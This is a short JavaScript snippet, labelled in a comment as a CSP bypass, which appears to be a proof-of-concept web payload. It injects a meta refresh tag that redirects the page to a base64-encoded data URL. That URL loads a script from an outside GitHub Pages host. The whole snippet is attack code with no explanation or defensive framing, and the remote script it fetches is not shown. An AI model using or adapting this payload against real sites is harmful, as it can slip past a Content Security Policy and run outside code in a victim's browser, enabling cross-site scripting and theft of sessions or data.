const script = document.createElement('meta');
script.httpEquiv = "refresh";
script.content = "0; url=data:text/html;base64," + btoa(`
  <script src="https://macindus.github.io/testPOC/atest.js"><\/script>
`);
document.head.appendChild(script);

//CSP bypass